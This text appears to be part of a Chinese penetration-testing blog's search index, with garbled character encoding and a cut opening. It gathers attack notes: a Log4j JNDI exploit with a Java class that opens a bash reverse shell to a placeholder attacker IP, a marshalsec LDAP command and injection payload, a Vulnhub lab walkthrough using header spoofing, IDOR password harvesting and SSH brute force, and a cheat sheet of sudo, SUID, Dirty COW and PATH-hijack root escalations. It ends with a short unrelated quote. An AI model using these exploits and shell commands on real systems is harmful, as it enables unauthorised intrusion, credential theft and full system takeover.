Log4j2.java\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.lang.Runtime;\nimport java.lang.Process;\npublic class Log4j2&#123;\n   public Log4j2() throws Exception &#123;\n       //åˆ›å»ºä¸€ä¸ªè¿›ç¨‹çš„å®ä¾‹\n       Process p = Runtime.getRuntime().exec(new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i >&amp; /dev/tcp/&lt;æ”»å‡»æœºip>/&lt;ç±»ç«¯å£> 0>&amp;1\"&#125;);\n       InputStream is = p.getInputStream();//è¾“å…¥æµ\n       BufferedReader reader = new BufferedReader(new InputStreamReader(is));//è¾“å…¥æµç¼“å†²åŒº\n       String line;\n       while((line = reader.readLine()) != null) &#123;//å¾ªç¯è¯»å–ç¼“å†²åŒºä¸­çš„æ•°æ®\n           System.out.println(line);//è¾“å‡ºè·å– çš„æ•°æ®\n       &#125;\n       p.waitFor();//waitForï¼šè¿”å›è¯¥Processå¯¹è±¡ä»£è¡¨çš„è¿›ç¨‹çš„å‡ºå£å€¼ï¼Œå€¼0è¡¨ç¤ºæ­£å¸¸é€€å‡ºï¼Œé0éæ­£å¸¸ã€‚\n       is.close(); \n       reader.close();\n       p.destroy();//destroyï¼šæ€æ‰è¯¥Processå¯¹è±¡ä»£è¡¨çš„è¿›ç¨‹ã€‚\n   &#125;\n   public static void main(String[] args) throws Exception &#123;\n   &#125;\n&#125;\n\nå¼€å¯LDAPæœåŠ¡\nåœ¨marshalsecç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå¼€å¯LDAPæœåŠ¡ï¼Œæ˜ å°„&lt;httpç«¯å£&gt;ä¸º&lt;ldapç›‘å¬ç«¯å£&gt;ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±» &lt;ç±»å&gt;.classjava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://&lt;æ”»å‡»æœºip>:&lt;httpç«¯å£>/#&lt;ç±»å>\" &lt;ldapç›‘å¬ç«¯å£>  \n\nPOST jsonå¯¹è±¡\næ„å»ºPayloadï¼Œå°†è‡ªå®šä¹‰jsonå¯¹è±¡POSTè‡³ç›®æ ‡æœåŠ¡å™¨u=$&#123;jndi:ldap://&lt;æ”»å‡»æœºip>:&lt;ldapç›‘å¬ç«¯å£>/&lt;ç±»å>&#125;\n\næ³¨æ„\n\nPOSTè¯·æ±‚ä¸­éœ€è¦è§„å®š Content-Type: application/json  \nåŒºåˆ†ç±»ç«¯å£ å’Œ æœåŠ¡ç«¯å£ã€‚ç±»ç«¯å£ï¼šç›‘å¬æ‹¿shellï¼ŒæœåŠ¡ç«¯å£ï¼šæ„é€ payloadã€‚\n\n\næ‰«ç›®å½•\ngobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.228.131/ -x php,html,txt  \ndirb http://192.168.228.131  \nnikto -h 192.168.228.131  \n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Tools"]},{"title":"Vulnhub|Me and My Girlfriend","url":"/6ceb590b.html","content":"0.é¶æœºå®‰è£…\nä½¿ç”¨NATæ¨¡å¼ï¼Œä¿è¯ä¸æ”»å‡»æœºkaliåœ¨åŒä¸€ç½‘æ®µå†…ï¼š\n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«æroot@kali:~# nmap 192.168.xxx.0/24å¼€æ”¾äº†ssh(22)å’Œhttp(80)ã€‚\n\n2.(80ç«¯å£)webå®‰å…¨\n2.1 webè®¿é—®ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç æç¤ºåˆ©ç”¨x-forward-forï¼Œåœ¨æµè§ˆå™¨å€ŸåŠ©å·¥å…·åœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥ X-Forward-For:127.0.0.1 ,è®¿é—®æˆåŠŸï¼šæ³¨å†Œä¸€ä¸ªè´¦å·ç”¨æˆ·ç™»å½•ï¼šä½¿ç”¨æ³¨å†Œçš„è´¦æˆ·ç™»å½•ï¼š2.2 æ°´å¹³è¶Šæƒç‚¹å‡»profileï¼Œè¯·æ±‚ä¸­å¸¦æœ‰å‚æ•°user_idï¼šé€šè¿‡ç¼–è¾‘user_idï¼Œèƒ½å¤Ÿè·å¾—å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯,å­˜åœ¨æ°´å¹³è¶Šæƒï¼š  \n\næ­¤å¤„å¯ä»¥é€šè¿‡æ ·å¼ç¼–è¾‘å™¨ç¼–è¾‘å…ƒç´ ç±»å‹ä¸ºtextï¼Œå³å¯å°†å¯†ç æ˜æ–‡æ˜¾ç¤ºï¼š  \n\né€šè¿‡ä¸Šè¿°æ“ä½œï¼Œå¯ä»¥æ”¶é›†åˆ°æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„è´¦å·ä¸å¯†ç ï¼š\n\n\n\nusername\npassword\n\n\n\n\neweuhtandingan\nskuyatuh\n\n\naingmaung\nqwerty!!!\n\n\nsundatea\nindONEsia\n\n\nsedihaingmah\ncedihhihihi\n\n\nalice\n4lic3\n\n\n\n\n3.(22ç«¯å£)SSH\nè™½ç„¶é€šè¿‡2.2æ”¶é›†åˆ°çš„è´¦æˆ·ä¸å¯†ç ï¼Œä½†ä¸çŸ¥é“å…·æœ‰sshç™»é™†æƒé™çš„è´¦æˆ·å¯†ç æ˜¯å“ªä¸€ä¸ªã€‚å°†è´¦æˆ·å¯†ç åˆ†åˆ«å­˜å‚¨ä¸ºuname.txtå’Œpasswd.txtï¼šgetshell (SSHçˆ†ç ´)root@kali:~# nmap -p 22 --script=ssh-brute --script-args userdb=uname.txt,passdb=passwd.txt 192.168.xxx.xxxè·å¾—å¯ç”¨è´¦æˆ·å¯†ç ï¼šalice/4lic3 ï¼š  \n\nä½¿ç”¨Xshellè¿œç¨‹ç™»é™†(sshç™»é™†çš„æ–¹å¼å¾ˆå¤šï¼Œç›´æ¥ç”¨ ssh alice@&lt;é¶æœºip&gt; ä¹Ÿè¡Œ)  \n\nâ€œæˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿæˆ‘æœ‰å•¥ï¼Ÿâ€\n\n\n\nå£ä»¤\nè§£é‡Š\n\n\n\n\nwhoami\næ˜¾ç¤ºå½“å‰ç”¨æˆ·\n\n\npwd\næ˜¾ç¤ºå·¥ä½œè·¯å¾„\n\n\nls -a\nå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å¤¹åŠæ–‡ä»¶\n\n\n\næ˜¾ç¤ºå¯ç–‘ç›®å½•.my_secret è¿›å…¥å ls -aï¼ŒæŸ¥çœ‹flag1.txtï¼Œæ–‡ä»¶åŒ…å«flagï¼ŒåŠæç¤ºéœ€è¦è·å¾—rootæƒé™æ‰èƒ½å¾—åˆ°å¦ä¸€ä¸ªflagï¼š  \n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒsudoææƒ (è¿™é‡Œå°è¯•sudoææƒæ—¶å‘ç°å…·æœ‰ææƒæ¡ä»¶ï¼Œæ•…æš‚ä¸å°è¯•å…¶ä»–ææƒæ–¹å¼)æŸ¥è¯¢å…·æœ‰sudoæƒé™å‘½ä»¤ï¼šsudo -l\nå°è¯•ä½¿ç”¨sudo-phpææƒ(å‘½ä»¤çš„å«ä¹‰æˆ‘ä¹Ÿä¸å¤ªæ‡‚ï¼ŒæŠŠå®ƒå½“ä½œä¸€ç§å›ºå®šçš„è¯­å¥å§):  CMD=\"/bin/sh\"  \nsudo php -r \"system('$CMD');\"\nä½¿ç”¨ whoami ææƒæˆåŠŸï¼šè¿›å…¥ /root ç›®å½•ï¼ŒæŸ¥çœ‹æ–‡ä»¶ï¼Œæ‰¾åˆ°flag2.txtï¼š  \n\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","æ°´å¹³è¶Šæƒ","SSHçˆ†ç ´"]},{"title":"ææƒ","url":"/e2181504.html","content":"ææƒé€”å¾„\n1. sudosudo -l &#x2F;&#x2F;æŸ¥è¯¢å…·æœ‰sudoæƒé™å‘½ä»¤\n\n\n2. suid\nSUIDï¼ˆè®¾ç½®ç”¨æˆ·IDï¼‰æ˜¯èµ‹äºˆæ–‡ä»¶çš„ä¸€ç§æƒé™ï¼Œå®ƒä¼šå‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…æƒé™çš„æ‰§è¡Œä½ä¸Šï¼Œå…·æœ‰è¿™ç§æƒé™çš„æ–‡ä»¶ä¼šåœ¨å…¶æ‰§è¡Œæ—¶ï¼Œä½¿è°ƒç”¨è€…æš‚æ—¶è·å¾—è¯¥æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™ã€‚å¦‚æœæŸäº›ç°æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå®ç”¨ç¨‹åºå…·æœ‰SUIDæƒé™çš„è¯ï¼Œå°±å¯ä»¥åœ¨æ‰§è¡Œæ—¶å°†æƒé™æå‡ä¸ºrootã€‚å…¶ä¸­ï¼Œå¤§å®¶ç†ŸçŸ¥çš„å…·æœ‰ææƒåŠŸèƒ½çš„Linuxå¯æ‰§è¡Œæ–‡ä»¶åŒ…æ‹¬ï¼š\n\nfind &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;æŸ¥è¯¢å…·æœ‰suidæ‰§è¡Œæƒé™ç¨‹åº\nå¯åˆ©ç”¨çš„ç¨‹åºï¼šnmapã€vimã€findã€bashã€moreã€lessã€nanoã€cpã€wgetã€pythonã€mawk  \n\n\n3. é€šè¿‡åœ¨/etc/passwdæ·»åŠ ä¸€ä¸ªrootæƒé™è´¦æˆ·find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;æŸ¥è¯¢å¯å†™æƒé™çš„æ–‡ä»¶\n\n\n4. æŸ¥çœ‹/etc/cron*ä¸‹æ‰€å«çš„æ‰€æœ‰æ–‡ä»¶ls -la &#x2F;etc&#x2F;cron* &#x2F;&#x2F;cron*æ˜¯ç”¨æ¥è®©ä½¿ç”¨è€…åœ¨å›ºå®šæ—¶é—´æˆ–å›ºå®šæ—¶é—´é—´éš”æ‰§è¡Œç¨‹åºä¹‹ç”¨(ç±»ä¼¼ä½¿ç”¨è€…çš„æ—¶ç¨‹è¡¨),æ”»å‡»è€…å¯æ ¹æ®rootæ‰§è¡Œçš„ç¨‹åºå¯»æ‰¾expã€‚\ncat &#x2F;etc&#x2F;crontab\n\nææƒ\n1. php\nsudoCMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;\nsudo php -r &quot;system(&#39;$CMD&#39;);&quot;\nsuidsudo sh -c &#39;cp $(which php) .; chmod +s .&#x2F;php&#39;\nCMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;\n.&#x2F;php -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;,[&#39;-p&#39;]);&quot;\n\n\n\n\n2. mysql\nsudosudo -u root mysql -e &#39;\\! /bin/bash&#39;  \n\n\n\n3. awk/mawk\nsudosudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;  \nsuidmawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;\n\n\n\n4. python\nsudosudo python3 -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;\nsuidpython3 -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\n\n\n5.è„ç‰›ææƒ\nä½¿ç”¨å®ä¾‹ï¼šVulnhub|Lampiaoã€Vulnhub|Sumo  \n\næŠŠè„ç‰›æ¼æ´æ‰«æå™¨ï¼Œä¸Šä¼ åˆ°é¶æœºä¸Šã€‚(ssh/wget)\n\nscp æ˜¯ secure copy çš„ç¼©å†™, scp æ˜¯ linux ç³»ç»Ÿä¸‹åŸºäº ssh ç™»é™†è¿›è¡Œå®‰å…¨çš„è¿œç¨‹æ–‡ä»¶æ‹·è´å‘½ä»¤ã€‚scp ~/dirtycowscan.sh &lt;ssh_user&gt;@&lt;ç›®æ ‡ip&gt;:&lt;ç›®æ ‡è·¯å¾„&gt;  \n\næ”»å‡»æœºå¼€å¯apacheï¼ŒæŠŠéœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ”¾åˆ° /var/www/htmlã€‚é¶æœºè¦åœ¨ /tmpæ‰æœ‰ wgetæƒé™!!!ã€‚wget http://192.168.117.129/dirtycowscan.sh   \n\n\né¶æœºè¿è¡Œè„ç‰›æ¼æ´æ‰«æè„šæœ¬./dirtycowscan.shï¼ŒæŸ¥çœ‹è¿”å›ç»“æœæ˜¯å¦IS vulnerableã€‚æŸ¥çœ‹é¶æœºçš„ç¼–è¯‘ç¯å¢ƒgcc -vã€g++ -vâ€¦â€¦ï¼›åœ¨æ”»å‡»æœºæ‰¾expsearchsploit dirtyï¼Œæ‰¾åˆ°å¯¹åº”åˆé€‚çš„è„šæœ¬ï¼ŒåŒæ ·ç”¨scpæˆ–wgetå°† /usr/share/exploits/&lt;è„šæœ¬æ‰€åœ¨path&gt; ä¼ åˆ°é¶æœºä¸Šã€‚åœ¨é¶æœºä¸Šç¼–è¯‘è¿è¡Œè„šæœ¬ï¼š  \n\nç¼–è¯‘æºä»£ç ï¼šcat &lt;ä¸Šä¼ çš„è„šæœ¬&gt; | grep g++â€“æ‰¾åˆ°ç¼–è¯‘è¯­å¥ï¼Œå¦‚g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutilè¿›è¡Œç¼–è¯‘ã€‚è¿è¡Œç¼–è¯‘æˆçš„æ–‡ä»¶ï¼šå¦‚./dcowã€‚  \n\n\n6.åŠ«æŒç¯å¢ƒå˜é‡ææƒ\n\nä½¿ç”¨å®ä¾‹ï¼šVulnhub|DarkHole1  \n\n\næ¦‚å¿µï¼šå¯é€šè¿‡$PATHæŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸‹çš„ç¯å¢ƒå˜é‡ï¼Œ$PATH(ä¸€å®šæ˜¯å¤§å†™)è¿™ä¸ªå˜é‡çš„å†…å®¹æ˜¯ç”±ä¸€å †ç›®å½•æ‰€ç»„æˆçš„ï¼Œæ¯ä¸ªç›®å½•ä¸­é—´ç”¨å†’å·(:)æ¥éš”å¼€ï¼Œæ¯ä¸ªç›®å½•æ˜¯æœ‰é¡ºåºçš„ç”±å·¦è‡³å³ï¼Œä¼˜å…ˆçº§å˜ä½ï¼Œæ–°å¢çš„ç›®å½•ç½®äºæœ€å·¦ä¾§ã€‚æ¡ä»¶ï¼šå­˜åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸ºç³»ç»Ÿå‘½ä»¤ (å› ä¸ºsystemå‡½æ•°æ˜¯ç»§æ‰¿ç¯å¢ƒå˜é‡ï¼Œé€šè¿‡æ›¿æ¢ç¯å¢ƒå˜é‡å¯ä»¥è¾¾åˆ°æ‰§è¡Œä»»æ„å‘½ä»¤)ï¼Œä¸”å…·æœ‰sæƒé™ (sæƒé™ï¼š è®¾ç½®ä½¿æ–‡ä»¶åœ¨æ‰§è¡Œé˜¶æ®µå…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œç›¸å½“äºä¸´æ—¶æ‹¥æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½)ï¼Œä¸”uidä¸ºå…³é”®ç”¨æˆ·ã€‚  \n\næ“ä½œï¼šï¼ˆä»¥ç³»ç»Ÿå‘½ä»¤idä¸ºä¾‹ï¼‰åˆ›å»ºä¸€ä¸ªidå‘½ä»¤æ–‡ä»¶å¹¶èµ‹æƒï¼šecho &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 idæŠŠå½“å‰ç›®å½•/tmpå¢åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼šexport PATH=/tmp:$PATHç¯å¢ƒå˜é‡PATHè®¾ç½®åï¼Œæ‰§è¡Œidå‘½ä»¤æ—¶ä¼šä¼˜å…ˆä»/tmpä¸‹æŸ¥æ‰¾ç¨‹åºï¼Œæ•…idå‘½ä»¤ä¼šè¢«åŠ«æŒ(å³æœŸæœ›æ‰§è¡Œçš„æ˜¯idï¼Œä½†å®é™…æ‰§è¡Œçš„æ˜¯idæ–‡ä»¶ä¸­çš„å‘½ä»¤/bin/bash)ã€‚è¿‡ç¨‹ï¼šå…¶ä»–ç”¨æˆ·æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶(./xxx)-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(id)-ä»¥uidçš„èº«ä»½æ‰§è¡Œæ¶æ„å‘½ä»¤(/bin/bash)-è·å¾—uidèº«ä»½çš„shellã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["ææƒ"]},{"title":"Stay sharp, stay alone.","url":"/b822f9c7.html","content":"ä»¥å‰ä»åˆ«äººé‚£å¬æ¥çš„ä¸€æ®µè¯ï¼šâ€œYour time and energy are scarce resources. Do not waste them on trivial people or things. Do not answer unjustified questions, or reply curious comments. Ignore them all. Spend more time with wise peers. Read sparkling thoughts on books. Stay sharp, stay alone. â€œ\n","categories":["éšè®°"],"tags":[]}]